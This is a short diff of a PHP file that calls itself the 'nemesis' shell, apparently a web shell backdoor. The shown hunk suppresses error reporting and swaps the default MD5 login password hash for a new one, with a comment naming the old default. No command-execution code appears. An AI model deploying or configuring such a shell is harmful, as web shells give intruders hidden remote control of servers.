@@ -10,7 +10,7 @@ error_reporting(0);
 $s_name = "nemesis"; // shell name
 $s_ver = "0.1"; // shell ver
 $s_title = $s_name." ".$s_ver; // shell title
-$s_pass = "59606609c6f2b0f4ac81167fe123c3f1"; // default : nemesis
+$s_pass = "5f0cdbcc97175ed8ddf280cd59107ed3";
 $s_color = "#6400ff"; // shell theme color, default : 4c83af
 $s_login_time = 3600 * 24 * 7; // cookie time (login)
 
